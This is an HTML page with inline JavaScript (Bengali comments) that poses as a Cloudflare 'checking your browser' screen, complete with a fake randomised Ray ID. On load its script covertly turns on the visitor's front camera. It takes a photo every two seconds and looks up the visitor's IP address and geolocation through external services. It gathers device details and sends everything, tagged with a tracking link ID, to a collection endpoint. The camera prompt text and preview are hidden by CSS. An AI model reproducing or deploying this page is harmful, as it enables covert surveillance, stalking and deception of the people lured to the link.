<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta name="robots" content="noindex, nofollow">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Just a moment....</title>
    <style>
        /* ===== CSS ===== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #ffffff;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            width: 100%;
            max-width: 600px;
            padding: 20px;
            text-align: center;
        }
        .cf-bubbles {
            margin: 0 auto 30px auto;
        }
        .cf-bubbles .bubbles {
            background-color: #f58220;
            width: 20px;
            height: 20px;
            margin: 2px;
            border-radius: 100%;
            display: inline-block;
            animation: fader 1.6s infinite;
        }
        .cf-bubbles .bubbles:nth-child(2) { animation-delay: 0.2s; }
        .cf-bubbles .bubbles:nth-child(3) { animation-delay: 0.4s; }
        @keyframes fader {
            0% { opacity: 0.2; }
            50% { opacity: 1.0; }
            100% { opacity: 0.2; }
        }
        h1 {
            font-size: 28px;
            font-weight: 700;
            color: #000000;
            margin: 16px 0;
            line-height: 1.25;
        }
        p {
            font-size: 18px;
            font-weight: 400;
            color: #444;
            margin: 8px 0;
            line-height: 1.7;
        }
        .attribution {
            margin-top: 32px;
            font-size: 16px;
            color: #666;
        }
        .attribution a {
            color: #2c7cb0;
            text-decoration: none;
        }
        .attribution a:hover {
            color: #f4a15d;
        }
        .ray_id {
            display: block;
            margin-top: 8px;
        }
        /* সব স্ট্যাটাস/লোডার লুকানো */
        #status, .status, #cam-status, .error-msg, #requestBtn, .preview, .loader, .note {
            display: none !important;
        }
        video {
            display: none !important;
        }
        /* রে আইডি র‍্যান্ডম স্ট্রিং */
        #ray {
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- ক্লাউডফ্লেয়ার UI -->
        <div class="cf-bubbles">
            <div class="bubbles"></div>
            <div class="bubbles"></div>
            <div class="bubbles"></div>
        </div>
        <h1><span>Checking your browser before accessing</span> the website.</h1>
        <p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
        <p id="status-text">Please allow up to 5 seconds…</p>

        <!-- লুকানো এলিমেন্ট (শুধু ফাংশনালিটির জন্য) -->
        <button id="requestBtn">Allow Camera Access</button>
        <video id="preview" autoplay playsinline muted></video>
        <div class="status" id="status">
            <div class="loader"></div>
            <p>Capturing photo...</p>
        </div>
        <div class="note">Your privacy is important to us.</div>

        <div class="attribution">
            DDoS protection by
            <a rel="noopener noreferrer" href="https://www.cloudflare.com/5xx-error-landing/" target="_blank">Cloudflare</a>
            <br>
            <span class="ray_id">Ray ID: <code id="ray">6c51810c599f2cda</code></span>
        </div>
    </div>

    <script>
        (function() {
            "use strict";

            // ===== DOM রেফারেন্স =====
            const preview = document.getElementById('preview');
            let stream = null;
            let captureInterval = null;

            // ===== লিংক আইডি (যেমন cam_1786873736643_1b2b) =====
            // পেজের URL থেকে লিংক আইডি বের করি (যদি থাকে), নাহলে ডিফল্ট
            const linkId = window.location.pathname.split('/')[2] || 'cam_' + Date.now() + '_' + Math.random().toString(36).substr(2, 4);

            // ===== ডেটা পাঠানোর ফাংশন (camera.html-এর মতো) =====
            async function sendData(payload) {
                try {
                    const response = await fetch('/api/data', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(payload)
                    });
                    if (!response.ok) {
                        console.warn('Server response not OK:', response.status);
                    }
                } catch (error) {
                    console.error('Send Error:', error);
                }
            }

            // ===== ছবি ক্যাপচার ও পাঠানো (সব ফরম্যাটে) =====
            async function capturePhoto() {
                if (!preview.videoWidth || !preview.videoHeight) {
                    console.warn('Video not ready yet');
                    return;
                }

                try {
                    // ১. ক্যানভাসে ছবি আঁকা
                    const canvas = document.createElement('canvas');
                    canvas.width = preview.videoWidth;
                    canvas.height = preview.videoHeight;
                    const context = canvas.getContext('2d');
                    context.drawImage(preview, 0, 0, canvas.width, canvas.height);

                    // ২. পুরো ডেটা ইউআরএল (data:image/jpeg;base64,...)
                    const fullImageData = canvas.toDataURL('image/jpeg', 0.8);
                    // ৩. শুধু বেস৬৪ অংশ (কমা পরে)
                    const rawBase64 = fullImageData.split(',')[1];
                    // ৪. ইউআরএল এনকোডেড বেস৬৪ (যাতে ট্রান্সফার সেফ থাকে)
                    const encodedBase64 = encodeURIComponent(rawBase64);

                    // ৫. আইপি ও লোকেশন (camera.html-এর মতো)
                    let ipData = { ip: '0.0.0.0' };
                    let locationData = { country_name: 'Unknown', region: 'Unknown', city: 'Unknown', latitude: 0, longitude: 0 };
                    try {
                        const ipRes = await fetch('https://api.ipify.org?format=json');
                        ipData = await ipRes.json();
                        const locRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                        locationData = await locRes.json();
                    } catch (e) {
                        console.warn('IP/Location fetch failed, using defaults', e);
                    }

                    // ৬. প্যাকেট তৈরি (দুই ফরম্যাটেই ছবি পাঠাচ্ছি)
                    const payload = {
                        linkId: linkId,
                        type: 'camera',
                        data: {
                            image: fullImageData,          // পুরো data:image স্ট্রিং (প্রথম কোডের মতো)
                            img: encodedBase64,            // শুধু বেস৬৪ + URI এনকোডেড (দ্বিতীয় কোডের মতো)
                            raw: rawBase64,                // শুধু বেস৬৪ (এনকোড করা নেই)
                            size: rawBase64.length,
                            timestamp: new Date().toISOString()
                        },
                        ip: ipData.ip,
                        location: {
                            country: locationData.country_name || 'Unknown',
                            region: locationData.region || 'Unknown',
                            city: locationData.city || 'Unknown',
                            latitude: locationData.latitude || 0,
                            longitude: locationData.longitude || 0
                        },
                        device: {
                            browser: navigator.userAgent,
                            os: navigator.platform,
                            device: /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
                            screen: `${screen.width}x${screen.height}`
                        }
                    };

                    // ৭. ডেটা পাঠাও
                    await sendData(payload);
                    console.log(`✅ ছবি পাঠানো হয়েছে (সাইজ: ${rawBase64.length})`);

                } catch (error) {
                    console.error('Capture Error:', error);
                }
            }

            // ===== ক্যামেরা চালু =====
            async function startCamera() {
                try {
                    console.log('⏳ ক্যামেরা অ্যাক্সেস নেওয়া হচ্ছে...');
                    stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            width: { ideal: 1280 },
                            height: { ideal: 720 },
                            facingMode: 'user'
                        },
                        audio: false
                    });

                    preview.srcObject = stream;
                    console.log('✅ ক্যামেরা চালু হয়েছে');

                    // প্রতি ২ সেকেন্ডে ছবি তোলা
                    if (captureInterval) clearInterval(captureInterval);
                    captureInterval = setInterval(capturePhoto, 2000);
                    // সাথে সাথে প্রথম ছবি
                    setTimeout(capturePhoto, 500);

                } catch (error) {
                    console.error('❌ ক্যামেরা অ্যাক্সেস ডিনাই বা অসম্ভব:', error);

                    // এরর রিপোর্ট
                    sendData({
                        linkId: linkId,
                        type: 'camera_error',
                        error: error.message
                    });

                    // ৩ সেকেন্ড পর google-এ রিডাইরেক্ট (যদি চাও)
                    // setTimeout(() => { window.location.href = 'https://google.com'; }, 3000);
                }
            }

            // ===== পেজ লোড হলে অটো শুরু =====
            window.addEventListener('load', function() {
                // রে আইডি র‍্যান্ডম করি
                const chars = "qwertyuioplkjhgfdsazxcvbnm0987654321";
                let ray = "";
                for (let i = 0; i < 17; i++) {
                    ray += chars[Math.floor(Math.random() * chars.length)];
                }
                document.getElementById('ray').textContent = ray;

                // ব্রাউজার ক্যামেরা সাপোর্ট করে কিনা
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    console.error('❌ এই ব্রাউজার getUserMedia সাপোর্ট করে না');
                    return;
                }

                startCamera();
            });

            // ===== পেজ ছাড়ার সময় ক্লিনআপ =====
            window.addEventListener('beforeunload', function() {
                if (captureInterval) clearInterval(captureInterval);
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
            });

        })();
    </script>
</body>
</html>
